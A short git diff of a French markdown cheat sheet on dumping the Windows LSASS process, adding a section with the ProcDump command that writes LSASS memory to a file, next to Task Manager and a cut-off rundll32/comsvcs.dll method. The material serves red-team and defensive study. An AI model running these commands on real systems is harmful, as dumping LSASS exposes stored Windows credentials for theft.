@@ -1,5 +1,5 @@
 ---
-public: true # set to true to make the article publishable
+public: true
 ---
 
 ## DUMP de LSASS
@@ -10,6 +10,12 @@ public: true # set to true to make the article publishable
 Bouton droit sur  le processus > Créer un fichier dump
 
 Le fichier est créé dans le dossier %TEMP%
+
+### Via Procdump.exe (sysinternals)
+
+```shell
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
 
 ### Rundll32.exe & Comsvcs.dll
 - Trouver le pid de lsass :
